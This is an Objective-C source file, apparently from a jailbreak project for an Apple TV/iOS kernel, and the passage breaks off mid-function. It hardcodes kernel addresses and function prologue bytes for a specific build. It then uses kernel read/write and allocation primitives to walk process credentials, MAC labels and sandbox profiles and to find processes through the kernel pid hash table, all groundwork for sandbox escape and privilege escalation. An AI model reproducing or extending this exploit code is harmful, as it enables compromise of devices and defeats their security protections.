#import "dt_build681_boomerang.h"
#import "dt_build681_client.h"
#import "dt_baked_offsets.h"
#import "dt_physrw.h"
#import "dt_misaka_offsets.h"
#import "dt_build710_preboot.h"
#import "DTRunLogger.h"
#import "DTLogCapture.h"
#import "DTRootHelperClient.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "spawn_root.h"
#import "dt_choma_platform_sign.h"
#import "dt_build725r_launchd_probe.h"
#import "dt_build726d_launchd_read_diag.h"
#import "dt_build727r_launchd_contract_telemetry.h"
#import "dt_build729a_self_page_protection.h"
#import "dt_bootstrap_preflight.h"
#import "dt_build102739m.h"
#import "dt_build102739n.h"
#import "dt_rootless_bringup.h"
#import "dt_rootless_state.h"
#import "dt_rootless_install.h"
#import "dt_rootless_r9_product.h"
#import "dt_rootless_phys_leaves.h"

#import "info.h"
#import "primitives.h"
#import "kernel.h"
#import "kcall_arm64.h"
#import "kalloc_pt.h"
#import "translation.h"
#import "dt_kcall_arm64_tvos.h"

#import <dirent.h>
#import <dlfcn.h>
#import <errno.h>
#import <mach/mach.h>
#import <signal.h>
#import <stdarg.h>
#import <stdbool.h>
#import <stdlib.h>
#import <string.h>
#import <time.h>
#import <fcntl.h>
#import <sys/mman.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <sys/wait.h>
#import <unistd.h>
#import <uuid/uuid.h>

extern void sandbox_extension_release(const char *extension_token);
extern bool kalloc_pt_is_initialized(void);
extern unsigned kalloc_pt_pool_count(void);
extern int kalloc_pt_prefill(unsigned count);
#import <mach-o/dyld.h>
#import <limits.h>

#import <signal.h>
#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonCrypto.h>
#import <mach-o/loader.h>

#ifndef O_CLOEXEC
#define O_CLOEXEC 0
#endif

#ifndef O_NOFOLLOW
#define O_NOFOLLOW 0
#endif

// IDA j105a unslid — BUILD10252_KCALL_IDA_FULL_TRACE.txt (MCP verified 2026-06-19)
static const uint64_t kDTUnslidProcPid = 0xfffffff0075e4f88ULL;
/* IDA _proc_ucred @ 0xFFFFFFF0075E65D8 — MCP j105a 20L563 entry (NOT 5E65E0: mid-body RET loads LR from kcall stack) */
static const uint64_t kDTUnslidProcUcred = 0xfffffff0075e65d8ULL;
static const uint8_t kDTProcUcredPrologue[8] = {
    0xFD, 0x7B, 0xBF, 0xA9, 0xFD, 0x03, 0x00, 0x91  /* STP X29,X30; MOV X29,SP @ get_bytes 5E65D8 */
};
// MCP get_bytes @ 75E4F88: FD 7B BF A9 FD 03 00 91 80 03 00 B4 ...
static const uint8_t kDTProcPidPrologue[16] = {
    0xFD, 0x7B, 0xBF, 0xA9, 0xFD, 0x03, 0x00, 0x91,
    0x80, 0x03, 0x00, 0xB4, 0xE1, 0x03, 0x00, 0xAA
};
static const uint64_t kDTUnslidSandboxConsume55106C = 0xfffffff00655106cULL;
static const uint64_t kDTUnslidSandboxApply53D540 = 0xfffffff00653d540ULL;
static const uint64_t kDTUnslidProcToProfile532C68 = 0xfffffff006532c68ULL;
static const uint64_t kDTUnslidMacLabelGetProfile532930 = 0xfffffff006532930ULL;
static const uint64_t kDTUnslidChildInherit533304 = 0xfffffff006533304ULL;
static const uint64_t kDTUnslidSetProfile532A80 = 0xfffffff006532a80ULL;
/* BUILD102688A/689 — IDA j105a 20L563 MCP 2026-07-05 */
static const uint64_t kDTUnslidApplyMasks5329AC = 0xfffffff0065329acULL;
static const uint64_t kDTUnslidFilterMsgFlagSet5ECB14 = 0xfffffff0075ecb14ULL;
static const uint64_t kDTUnslidFilterMsgFlagGet5ECB50 = 0xfffffff0075ecb50ULL;
static const uint64_t kDTUnslidKernprocGlobal = 0xfffffff007194270ULL;
static const uint64_t kDTUnslidDefaultUnixMaskSlot = 0xfffffff006ecc3c0ULL;
static const uint64_t kDTUnslidDefaultMachMaskSlot = 0xfffffff006ecc3c8ULL;
static const uint64_t kDTUnslidDefaultMigMaskSlot = 0xfffffff006ecc3d0ULL;
/* BUILD102691 — RO zone globals (IDA sub_239470 / sub_84BDEC / sub_84B860) */
static const uint64_t kDTUnslidROZoneLo = 0xfffffff0071005d8ULL;
static const uint64_t kDTUnslidROZoneHi = 0xfffffff0071005e0ULL;
static const uint64_t kDTUnslidROZoneMeta = 0xfffffff007100630ULL;
static const uint64_t kDTUnslidROZone5TableDword = 0xfffffff0071058b8ULL;
static const uint64_t kDTProcFilterFlagsOff = 0x458ULL;
static const uint64_t kDTProcFilterExtOff = 0x720ULL;
static const uint64_t kDTFilterExtMachCellOff = 0x370ULL;
static const size_t kDTUnixSyscallMaskBytes = 0x22CULL;
static const size_t kDTMachTrapMaskBytes = 0x80ULL;
static const uint64_t kDTUnslidMmapOp53349C = 0xfffffff00653349cULL;
static const uint64_t kDTUnslidSandboxRuntimeSlotECACE4 = 0xfffffff006ecace4ULL;
// IDA _proc_find @ 0xFFFFFFF0075E44AC — pid hash table meta @ qword_FFFFFFF0079090F0
static const uint64_t kDTUnslidPidHashMeta = 0xfffffff0079090f0ULL;
// IDA kern_exit.c — exiting-proc list sentinel (kernel proc_iterate flag 2 path)
static const uint64_t kDTUnslidAllprocZombieSentinel = 0xfffffff0078d8a78ULL;
static const uint32_t kDTProcHashLinkOff = 0xa0; /* proc+160 hash chain; proc = link-0xa0 */
static const uint32_t kDTUcredLabelOff = 0x78; /* IDA: *(cred+0x78) in 533304 / 532C68 */
// IDA j105a 20L563 ipc_tt — MCP 2026-07-04 (mach_ports_lookup @ 200188 / mach_ports_register @ 1FFF20)
static const uint64_t kDTUnslidMachPortsRegister1FFF20 = 0xfffffff0071fff20ULL;
static const uint64_t kDTUnslidIpcPortCopySend1DE0F0 = 0xfffffff0071de0f0ULL;
// IDA mach_ports_lookup @ 2001AC: ADR qword_1A5A60; ORR X0,#1; MOV W1,#0x18; MOV W2,#0x8004 → BL sub_203A9C
static const uint64_t kDTUnslidKalloc203A9C = 0xfffffff007203a9cULL;
static const uint64_t kDTUnslidMachPortsArrayKallocTag1A5A60 = 0xfffffff0071a5a60ULL;
static const uint32_t kDTTaskItkRegistered0 = 0x2E0u; /* LDR [task,#0x2E0] @ 200234 */
static const uint32_t kDTTaskItkRegistered1 = 0x2E8u; /* LDR [task,#0x2E8] @ 200240 */
static const uint32_t kDTTaskItkRegistered2 = 0x2F0u; /* LDR [task,#0x2F0] @ 20024C; initPorts[2] */

static const char *const kDTClassRead = "com.apple.app-sandbox.read";
static const char *const kDTClassRW = "com.apple.app-sandbox.read-write";
static const char *const kDTClassExec = "com.apple.sandbox.executable";
static const char *const kDTJbPath = "/private/var/jb/";
static const char kDT629Phase2JbPath[] = "/private/var/jb";
static const char kDT631Phase3PrimaryTarget[] = "/private/var/jb/usr/bin/probe_true";
static const char kDT631Phase3UsrBinDir[] = "/private/var/jb/usr/bin";
static const char kDT609ReadDataPath[] = "/private/var/jb/usr/bin/bash";
static const size_t kDT609ReadDataBytes = 16;
static const char kDT611MmapPath[] = "/private/var/jb/usr/bin/bash";
static const size_t kDT611MmapPageSize = 4096;
static const int kDT611MmapProt = PROT_READ | PROT_EXEC;
static const int kDT611MmapFlags = MAP_PRIVATE;
static const size_t kDT611MachMagicBytes = 4;
static const size_t kDT611MmapProbeBytes = 16;

static const size_t kDT613MmapPageSize = 4096;
static const int kDT613MmapProt = PROT_READ | PROT_EXEC;
static const int kDT613MmapFlags = MAP_PRIVATE;
static const size_t kDT613MachMagicBytes = 4;
static const size_t kDT613MmapProbeBytes = 16;

static const char kDT614TargetPath[] = "/private/var/jb/usr/bin/bash";
static const char kDT614SandboxOp[] = "file-map-executable";
static const int kDT614SandboxCheckFlags = 0x40000001; /* SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT */
static const size_t kDT614MachMagicBytes = 4;

static const char kDT616JbrootPath[] = "/private/var/jb/usr/bin/bash";
static const size_t kDT616MachMagicBytes = 4;

static NSString *g_dt1025_last_kcall_verdict = nil;

extern uint64_t task_self(void);
extern uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port);

static void dt1025_log(void (^log)(NSString *line), NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [[DTRunLogger shared] log:msg];
    if (log)
        log(msg);
}

static void dt1025_stage(NSString *stage)
{
    [[DTRunLogger shared] logStage:stage];
}

static uint64_t dt1025_kva(uint64_t unslid)
{
    return unslid + gSystemInfo.kernelConstant.slide;
}

static void dt1025_set_verdict(NSString * _Nullable * _Nullable out, NSString *v)
{
    if (out)
        *out = v;
}

static void dt1025_set_dash(BOOL * _Nullable out, BOOL v)
{
    if (out)
        *out = v;
}

static const uint64_t kDT592KcallSentinel = 0x1122334455667788ULL;

static BOOL dt102592_kva_canonical(uint64_t kva)
{
    if (kva < 0x10000ULL)
        return NO;
    if ((kva & 0x3FFFULL) != 0)
        return NO;
    if ((kva >> 48) != 0xFFFFULL)
        return NO;
    return YES;
}

static BOOL dt1025_kptr_canonical(uint64_t kptr)
{
    return kptr != 0 && dt102592_kva_canonical(kptr);
}

/* BUILD102605: sandbox heap pointers — kernel range, no 16KB alignment requirement */
static BOOL dt1025_kernel_range_kptr(uint64_t kptr)
{
    if (kptr < 0x10000ULL)
        return NO;
    if ((kptr >> 48) != 0xFFFFULL)
        return NO;
    return YES;
}

static BOOL dt1025_shape_small_scalar(uint64_t q)
{
    if (q == 0)
        return NO;
    return !dt1025_kernel_range_kptr(q);
}

static uint64_t dt1025_label_slot_raw(uint64_t label, unsigned slot)
{
    if (!label)
        return 0;
    return kread_ptr(label + 8ULL + ((uint64_t)slot * 8ULL));
}

static const char *dt1025_slot0_shape_verdict_tag(int verdict_code)
{
    switch (verdict_code) {
    case 1: return "KCALL600_SLOT0_SHAPE_NOT_SANDBOX_PROFILE";
    case 2: return "KCALL600_SLOT0_SHAPE_MIGHT_BE_SANDBOX_WRONG_SLOT";
    case 3: return "KCALL600_SLOT0_SHAPE_AMBIGUOUS";
    case 4: return "KCALL600_SLOT_DUMP_OTHER_RELEVANT_SLOT";
    default: return "KCALL600_SLOT0_SHAPE_SKIPPED";
    }
}

static BOOL dt1025_slot_raw_is_profile_candidate(uint64_t raw)
{
    return raw != 0 && raw != (uint64_t)-1LL;
}

/* BUILD102601/605 shape contract: +0x08 zero or kernel-range; +0x10 kernel-range backing */
static int dt1025_classify_sandbox_profile_shape(uint64_t profile, void (^log)(NSString *line),
    const char *tag)
{
    if (!dt1025_slot_raw_is_profile_candidate(profile))
        return 0;

    uint64_t q0 = kread64(profile + 0x00);
    uint64_t q8 = kread64(profile + 0x08);
    uint64_t q10 = kread64(profile + 0x10);
    uint64_t q18 = kread64(profile + 0x18);

    dt1025_log(log, @"[*] build102.6.05 %s profile shape ptr=0x%llx", tag,
        (unsigned long long)profile);
    dt1025_log(log, @"[*] build102.6.05 %s profile+0x00=0x%llx +0x08=0x%llx +0x10=0x%llx +0x18=0x%llx",
        tag,
        (unsigned long long)q0,
        (unsigned long long)q8,
        (unsigned long long)q10,
        (unsigned long long)q18);

    for (uint64_t off = 0x20; off <= 0xA0; off += 0x10) {
        uint64_t q = kread64(profile + off);
        dt1025_log(log, @"[*] build102.6.05 %s profile+0x%02llx=0x%llx",
            tag, (unsigned long long)off, (unsigned long long)q);
    }

    BOOL q8_zero = q8 == 0;
    BOOL q8_krange = dt1025_kernel_range_kptr(q8);
    BOOL q10_krange = dt1025_kernel_range_kptr(q10);
    BOOL q8_small_scalar = dt1025_shape_small_scalar(q8);

    dt1025_log(log, @"[*] build102.6.05 %s shape flags q8_zero=%d q8_krange=%d q8_small_scalar=%d q10_krange=%d",
        tag, q8_zero ? 1 : 0, q8_krange ? 1 : 0, q8_small_scalar ? 1 : 0, q10_krange ? 1 : 0);

    if (q8_small_scalar) {
        dt1025_log(log, @"[*] build102.6.05 %s shape class NOT_SANDBOX_PROFILE (+0x08 scalar)",
            tag);
        return 1;
    }
    if ((q8_zero || q8_krange) && q10_krange) {
        dt1025_log(log, @"[*] build102.6.05 %s shape class VALID_SANDBOX_PROFILE_LIKE", tag);
        return 2;
    }
    dt1025_log(log, @"[*] build102.6.05 %s shape class AMBIGUOUS", tag);
    return 3;
}

static BOOL dt102592_sentinel_rw(uint64_t kva)
{
    if (kwrite64(kva, kDT592KcallSentinel) != 0)
        return NO;
    return kread64(kva) == kDT592KcallSentinel;
}

/// Pop one page from kalloc_pt, verify canonical KVA, return to pool — catches stale dylib / poisoned pool.
static int dt1025_kalloc_pt_smoke(void (^log)(NSString *line))
{
    uint64_t probe_kva = 0;
    uint64_t page = vm_real_kernel_page_size;
    if (!page)
        page = 0x4000ULL;

    if (kalloc_with_options(&probe_kva, page, KALLOC_OPTION_LOCAL) != 0) {
        dt1025_log(log, @"[!] build102.5.94 kalloc_pt smoke FAIL kalloc rc!=0");
        dt1025_stage(@"KALLOC_PT_SMOKE_FAIL=kalloc");
        return -1;
    }
    if (!dt102592_kva_canonical(probe_kva)) {
        dt1025_log(log, @"[!] build102.5.94 kalloc_pt smoke FAIL kva=0x%llx (expected 0xffff… canonical)",
            (unsigned long long)probe_kva);
        dt1025_stage(@"KALLOC_PT_SMOKE_FAIL=kva");
        (void)kfree(probe_kva, page);
        return -2;
    }
    if (kfree(probe_kva, page) != 0) {
        dt1025_log(log, @"[!] build102.5.94 kalloc_pt smoke FAIL kfree rc!=0 kva=0x%llx",
            (unsigned long long)probe_kva);
        dt1025_stage(@"KALLOC_PT_SMOKE_FAIL=kfree");
        return -3;
    }
    dt1025_log(log, @"[*] build102.5.94 kalloc_pt smoke OK kva=0x%llx pool=%u",
        (unsigned long long)probe_kva, kalloc_pt_pool_count());
    dt1025_stage(@"KALLOC_PT_SMOKE_OK");
    return 0;
}

typedef struct {
    uint64_t proc;
    uint64_t ucred;
    uint64_t label;
    uint64_t slot0_profile;
} dt1025_sandbox_chain_t;

static int dt1025_chain_for_pid(pid_t pid, dt1025_sandbox_chain_t *out, void (^log)(NSString *line))
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));

    /* Mirror kernel 532C68(proc): kauth_cred_proc_ref → label@cred+0x78 → 532930 slot0 */
    uint64_t proc = proc_find(pid);
    if (!proc) {
        dt1025_log(log, @"[!] build102.5.1 proc_find failed pid=%d", (int)pid);
        return -1;
    }

    out->proc = proc;
    out->ucred = proc_ucred(proc);
    if (!out->ucred) {
        dt1025_log(log, @"[!] build102.5.1 proc_ucred zero pid=%d proc=0x%llx",
            (int)pid, (unsigned long long)proc);
        proc_rele(proc);
        return -2;
    }

    out->label = kread_ptr(out->ucred + koffsetof(ucred, label));
    if (!out->label) {
        dt1025_log(log, @"[!] build102.5.1 label zero pid=%d ucred=0x%llx",
            (int)pid, (unsigned long long)out->ucred);
        proc_rele(proc);
        return -3;
    }

    /* 532930 @ 0xFFFFFFF006532930: mac_label_get_0(label, 0) — slot 0 ONLY (dword_ECACE4=0) */
    out->slot0_profile = mac_label_get(out->label, 0);
    proc_rele(proc);
    return 0;
}

typedef struct {
    pid_t pid;
    const char *tag;
    BOOL chain_ok;
    uint64_t proc;
    uint64_t ucred;
    uint64_t label;
    uint64_t slot_raw[8];
    uint64_t configured_raw;
    int configured_shape_class;
} dt1025_compare_target_t;

static int dt1025_dump_compare_target(pid_t pid, const char *tag, uint32_t configured_slot,
    dt1025_compare_target_t *out, void (^log)(NSString *line))
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));
    out->pid = pid;
    out->tag = tag;

    dt1025_sandbox_chain_t chain = { 0 };
    int chain_r = dt1025_chain_for_pid(pid, &chain, log);
    if (chain_r != 0) {
        dt1025_log(log, @"[!] build102.6.05 %s chain failed pid=%d r=%d", tag, (int)pid, chain_r);
        return chain_r;
    }

    out->chain_ok = YES;
    out->proc = chain.proc;
    out->ucred = chain.ucred;
    out->label = chain.label;

    dt1025_log(log, @"[*] build102.6.05 %s pid=%d proc=0x%llx ucred=0x%llx label=0x%llx",
        tag, (int)pid,
        (unsigned long long)out->proc,
        (unsigned long long)out->ucred,
        (unsigned long long)out->label);

    for (unsigned slot = 0; slot < 8; slot++) {
        out->slot_raw[slot] = dt1025_label_slot_raw(out->label, slot);
        dt1025_log(log, @"[*] build102.6.05 %s slot%u raw=0x%llx (off=0x%llx)",
            tag, slot,
            (unsigned long long)out->slot_raw[slot],
            (unsigned long long)(8ULL + ((uint64_t)slot * 8ULL)));
    }

    if (configured_slot < 8) {
        out->configured_raw = out->slot_raw[configured_slot];
        dt1025_log(log, @"[*] build102.6.05 %s configured_slot=%u raw=0x%llx",
            tag, (unsigned)configured_slot, (unsigned long long)out->configured_raw);
        if (out->configured_raw == (uint64_t)-1LL) {
            dt1025_log(log, @"[*] build102.6.05 %s configured slot raw=-1 (kernel mac_label_get → NULL)",
                tag);
        } else if (dt1025_slot_raw_is_profile_candidate(out->configured_raw)) {
            out->configured_shape_class =
                dt1025_classify_sandbox_profile_shape(out->configured_raw, log, tag);
        }
    }
    return 0;
}

static const char *dt1025_compare_final_verdict_tag(int code)
{
    switch (code) {
    case 1: return "KCALL602_COMPARE_BOTH_SLOT1_NULL";
    case 2: return "KCALL602_COMPARE_LAUNCHD_VALID_PROFILE";
    case 3: return "KCALL602_COMPARE_OTHER_VALID_PROFILE";
    case 4: return "KCALL602_COMPARE_INCONSISTENT";
    default: return "KCALL602_COMPARE_UNKNOWN";
    }
}

static int dt1025_compare_verdict_letter(int code)
{
    switch (code) {
    case 1: return 'A';
    case 2: return 'B';
    case 3: return 'C';
    case 4: return 'D';
    default: return '?';
    }
}

static int dt1025_optional_extra_pids(pid_t skip[8], size_t skip_count, pid_t out[4],
    size_t *out_count)
{
    static const char *kNames[] = { "cfprefsd", "configd", "trustd", "backboardd" };
    size_t found = 0;

    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t buf_size = 0;
    if (sysctl(mib, 4, NULL, &buf_size, NULL, 0) != 0 || buf_size == 0)
        return -1;

    struct kinfo_proc *procs = malloc(buf_size);
    if (!procs)
        return -1;
    if (sysctl(mib, 4, procs, &buf_size, NULL, 0) != 0) {
        free(procs);
        return -1;
    }

    size_t nproc = buf_size / sizeof(struct kinfo_proc);
    for (size_t ni = 0; ni < sizeof(kNames) / sizeof(kNames[0]) && found < 4; ni++) {
        for (size_t pi = 0; pi < nproc && found < 4; pi++) {
            pid_t p = procs[pi].kp_proc.p_pid;
            if (p <= 0)
                continue;
            BOOL dup = NO;
            for (size_t si = 0; si < skip_count; si++) {
                if (skip[si] == p) {
                    dup = YES;
                    break;
                }
            }
            if (dup)
                continue;
            for (size_t fi = 0; fi < found; fi++) {
                if (out[fi] == p) {
                    dup = YES;
                    break;
                }
            }
            if (dup)
                continue;
            if (strncmp(procs[pi].kp_proc.p_comm, kNames[ni], MAXCOMLEN) != 0)
                continue;
            out[found++] = p;
        }
    }
    free(procs);
    *out_count = found;
    return 0;
}

static void dt1025_log_ida_profile_gate(void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] build102.5.1 IDA gate: 55106C@0x%llx→532C68@0x%llx→532930@0x%llx(slot0)",
        (unsigned long long)kDTUnslidSandboxConsume55106C,
        (unsigned long long)kDTUnslidProcToProfile532C68,
        (unsigned long long)kDTUnslidMacLabelGetProfile532930);
    dt1025_log(log, @"[*] build102.5.1 IDA gate: helper→dash inherit 533304@0x%llx→532A80@0x%llx(child cred+0x%x)",
        (unsigned long long)kDTUnslidChildInherit533304,
        (unsigned long long)kDTUnslidSetProfile532A80,
        kDTUcredLabelOff);
    dt1025_log(log, @"[*] build102.5.1 IDA gate: dash dyld mmap op-16 via 53349C@0x%llx uses child slot0 profile+8",
        (unsigned long long)kDTUnslidMmapOp53349C);
    dt1025_log(log, @"[*] build102.5.1 IDA gate: dashAllowed iff app/helper share slot0 OR kcall(55106C,helper_proc) handles>0");
}

static void dt1025_log_chain(const char *who, pid_t pid, const dt1025_sandbox_chain_t *chain,
    void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] build102.5.1 %s pid=%d proc=0x%llx ucred=0x%llx label=0x%llx slot0=0x%llx",
        who, (int)pid,
        (unsigned long long)chain->proc,
        (unsigned long long)chain->ucred,
        (unsigned long long)chain->label,
        (unsigned long long)chain->slot0_profile);
}

static pid_t dt1025_parse_helper_pid(NSString *output)
{
    if (output.length == 0)
        return -1;
    NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:@"helper_pid=(\\d+)"
                                                                        options:0
                                                                          error:nil];
    if (!re)
        return -1;
    NSTextCheckingResult *m = [re firstMatchInString:output options:0
                                               range:NSMakeRange(0, output.length)];
    if (!m || m.numberOfRanges < 2)
        return -1;
    NSString *pidStr = [output substringWithRange:[m rangeAtIndex:1]];
    return (pid_t)[pidStr intValue];
}

static void dt1025_stop_helper(pid_t helper_pid, void (^log)(NSString *line))
{
    if (helper_pid <= 0)
        return;

    int status = 0;
    BOOL reaped = NO;

    kill(helper_pid, SIGTERM);
    for (int i = 0; i < 50; i++) {
        pid_t w = waitpid(helper_pid, &status, WNOHANG);
        if (w == helper_pid) {
            reaped = YES;
            break;
        }
        if (w < 0) {
            if (errno == EINTR)
                continue;
            if (errno == ECHILD)
                return;
            dt1025_log(log, @"[*] build102.6.27 helper waitpid errno=%d", errno);
            return;
        }
        if (kill(helper_pid, 0) != 0)
            break;
        usleep(10000);
    }

    if (!reaped && kill(helper_pid, 0) == 0) {
        dt1025_log(log, @"[*] build102.6.27 helper SIGTERM timeout pid=%d — SIGKILL", (int)helper_pid);
        kill(helper_pid, SIGKILL);
        for (int i = 0; i < 50; i++) {
            pid_t w = waitpid(helper_pid, &status, WNOHANG);
            if (w == helper_pid) {
                reaped = YES;
                break;
            }
            if (w < 0) {
                if (errno == EINTR)
                    continue;
                if (errno == ECHILD)
                    return;
                dt1025_log(log, @"[*] build102.6.27 helper waitpid errno=%d", errno);
                return;
            }
            usleep(10000);
        }
    }

    if (reaped)
        dt1025_log(log, @"[*] build102.6.27 helper hold stopped pid=%d status=0x%x", (int)helper_pid, status);
    else
        dt1025_log(log, @"[*] build102.6.27 helper stop gave up reaping pid=%d (non-blocking)", (int)helper_pid);
}

static NSString *dt1025_kread_cstring_krange(uint64_t kva, size_t max_len)
{
    if (!kva || !dt1025_kernel_range_kptr(kva))
        return nil;
    char buf[128];
    size_t cap = max_len < sizeof(buf) - 1 ? max_len : sizeof(buf) - 1;
    size_t i = 0;
    for (; i < cap; i++) {
        uint8_t b = kread8(kva + i);
        if (b == 0)
            break;
        if (b < 0x20 || b > 0x7e) {
            buf[i] = 0;
            return i ? [NSString stringWithUTF8String:buf] : nil;
        }
        buf[i] = (char)b;
    }
    buf[i] = 0;
    return i ? [NSString stringWithUTF8String:buf] : @"";
}

static NSString *dt1025_kread_cstring(uint64_t kva, size_t max_len)
{
    if (!kva || !dt1025_kptr_canonical(kva))
        return nil;
    char buf[128];
    size_t cap = max_len < sizeof(buf) - 1 ? max_len : sizeof(buf) - 1;
    size_t i = 0;
    for (; i < cap; i++) {
        uint8_t b = kread8(kva + i);
        if (b == 0)
            break;
        if (b < 0x20 || b > 0x7e) {
            buf[i] = 0;
            return i ? [NSString stringWithUTF8String:buf] : nil;
        }
        buf[i] = (char)b;
    }
    buf[i] = 0;
    return i ? [NSString stringWithUTF8String:buf] : @"";
}

static int dt1025_userspace_ppid(pid_t pid)
{
    struct kinfo_proc kp = { 0 };
    size_t size = sizeof(kp);
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, pid };
    if (sysctl(mib, 4, &kp, &size, NULL, 0) != 0)
        return -1;
    return kp.kp_eproc.e_ppid;
}

static BOOL dt1025_helper_entitlements_ok(void (^log)(NSString *line))
{
    NSString *entPath = [[NSBundle mainBundle] pathForResource:@"entitlements_helper" ofType:@"plist"];
    if (!entPath.length) {
        dt1025_log(log, @"[!] build102.6.25 entitlements_helper.plist missing from bundle");
        return NO;
    }
    NSDictionary *ent = [NSDictionary dictionaryWithContentsOfFile:entPath];
    if (!ent) {
        dt1025_log(log, @"[!] build102.6.25 entitlements_helper.plist unreadable");
        return NO;
    }
    if (ent[@"com.apple.private.security.no-sandbox"]) {
        dt1025_log(log, @"[!] build102.6.25 helper entitlements forbid no-sandbox (54CB88 NULL attach)");
        return NO;
    }
    id containerRequired = ent[@"com.apple.private.security.container-required"];
    if (!containerRequired || ![containerRequired boolValue]) {
        dt1025_log(log, @"[!] build102.6.25 helper needs container-required=true (556C60)");
        return NO;
    }
    if (![ent[@"platform-application"] boolValue]) {
        dt1025_log(log, @"[!] build102.6.25 helper needs platform-application (5C878EC Wall-A)");
        return NO;
    }
    NSString *appId = ent[@"application-identifier"];
    if (!appId.length) {
        dt1025_log(log, @"[!] build102.6.25 helper needs application-identifier (556F90)");
        return NO;
    }
    dt1025_log(log, @"[*] build102.6.25 helper IDA branch preflight OK platform=1 container-required=1 app-id=%@ no-sandbox=0",
        appId);
    return YES;
}

static NSString *dt1025_resolve_profile_name(uint64_t profile_ptr, void (^log)(NSString *line))
{
    uint64_t hdr = 0;
    uint64_t hdr_name_field = 0;
    uint64_t name_ptr = 0;
    NSString *name = nil;
    const char *path = nil;

    dt1025_log(log, @"[*] build102.6.26 profile name mirror profile_ptr=0x%llx",
        (unsigned long long)profile_ptr);

    if (!profile_ptr || profile_ptr == (uint64_t)-1LL || !dt1025_kernel_range_kptr(profile_ptr)) {
        dt1025_log(log, @"[!] build102.6.26 profile name reject profile_ptr=0x%llx",
            (unsigned long long)profile_ptr);
        return nil;
    }

    hdr = kread64(profile_ptr + 0x00);
    dt1025_log(log, @"[*] build102.6.26 profile name hdr=0x%llx (profile_ptr+0x00)",
        (unsigned long long)hdr);

    if (!hdr || !dt1025_kernel_range_kptr(hdr)) {
        dt1025_log(log, @"[!] build102.6.26 profile name hdr unreadable profile_ptr=0x%llx hdr=0x%llx",
            (unsigned long long)profile_ptr, (unsigned long long)hdr);
        return nil;
    }

    hdr_name_field = kread64(hdr + 0x78);
    dt1025_log(log, @"[*] build102.6.26 profile name hdr+0x78=0x%llx",
        (unsigned long long)hdr_name_field);

    name_ptr = hdr_name_field;
    dt1025_log(log, @"[*] build102.6.26 profile name name_ptr=0x%llx (primary hdr+0x78 deref)",
        (unsigned long long)name_ptr);

    if (dt1025_kernel_range_kptr(name_ptr)) {
        name = dt1025_kread_cstring_krange(name_ptr, 64);
        if (name.length) {
            path = "hdr+0x78";
            goto done;
        }
    }

    /* BUILD102625 shape fallback — 54BE48 log path: *( *compiled + 0x78 ) */
    {
        uint64_t compiled_root = kread64(hdr);
        dt1025_log(log, @"[*] build102.6.26 profile name fallback compiled_root=0x%llx (*hdr)",
            (unsigned long long)compiled_root);
        if (dt1025_kernel_range_kptr(compiled_root)) {
            uint64_t alt_name_ptr = kread64(compiled_root + 0x78);
            dt1025_log(log, @"[*] build102.6.26 profile name fallback name_ptr=0x%llx (compiled_root+0x78)",
                (unsigned long long)alt_name_ptr);
            if (dt1025_kernel_range_kptr(alt_name_ptr)) {
                name = dt1025_kread_cstring_krange(alt_name_ptr, 64);
                if (name.length) {
                    path = "compiled_root+0x78";
                    goto done;
                }
            }
        }
    }

    /* BUILD102625 observed wrapper: profile_ptr+0x08 container backing (informational probe only) */
    {
        uint64_t shape_q8 = kread64(profile_ptr + 0x08);
        uint64_t shape_q10 = kread64(profile_ptr + 0x10);
        dt1025_log(log, @"[*] build102.6.26 profile name shape +0x08=0x%llx +0x10=0x%llx",
            (unsigned long long)shape_q8, (unsigned long long)shape_q10);
    }

done:
    dt1025_log(log, @"[*] build102.6.26 profile name read path=%s result=%@",
        path ? path : "none", name ?: @"(null)");
    return name;
}

static int dt1025_proc_pid_hash_bucket(pid_t pid)
{
    unsigned p = (unsigned)pid;
    unsigned mixed = (unsigned)(-2073254261LL * ((2146121005U * (p ^ (p >> 16))) ^
        ((2146121005U * (p ^ (p >> 16))) >> 15)));
    return (int)(mixed ^ (mixed >> 16));
}

/* IDA kern_fork.c / kern_proc.c — p_ppid @ proc+0x20 (not 16KB-aligned proc kptrs) */
static const uint32_t kDTProcPpidOff = 0x20;

static BOOL dt1025_proc_kptr_pid_match(uint64_t proc, pid_t pid, pid_t expect_ppid)
{
    if (!proc || !dt1025_kernel_range_kptr(proc))
        return NO;

    pid_t kpid = (pid_t)kread32(proc + koffsetof(proc, pid));
    if (kpid != pid)
        return NO;

    if (expect_ppid >= 0 && (pid_t)kread32(proc + kDTProcPpidOff) != expect_ppid)
        return NO;

    return YES;
}

static BOOL dt1025_proc_resolve_method_non_libjailbreak(const char *method)
{
    return method && strcmp(method, "libjailbreak_allproc") != 0;
}

static uint64_t dt1025_proc_find_hash_ida(pid_t pid, pid_t expect_ppid)
{
    if (!g_dt_baked_offsets_active || pid <= 0)
        return 0;

    uint64_t htab_meta = kread64(dt1025_kva(kDTUnslidPidHashMeta));
    if (!htab_meta)
        return 0;

    uint64_t htab_base = htab_meta | 0xFFFF000000000000ULL;
    unsigned bucket_mask = (unsigned)(0xFFFFFFFFFFFFFFFFULL >> (unsigned char)(htab_meta >> 48));
    int bucket = dt1025_proc_pid_hash_bucket(pid) & (int)bucket_mask;
    uint64_t link = kread_ptr(htab_base + 8ULL * (unsigned)bucket);

    for (int step = 0; link && step < 4096; step++) {
        if (!dt1025_kernel_range_kptr(link))
            break;
        uint64_t proc = link - kDTProcHashLinkOff;
        if (dt1025_proc_kptr_pid_match(proc, pid, expect_ppid))
            return proc;
        link = kread_ptr(link);
    }
    return 0;
}

static uint64_t dt1025_proc_find_sentinel_list(pid_t pid, uint64_t sentinel_kva, pid_t expect_ppid)
{
    if (!sentinel_kva)
        return 0;

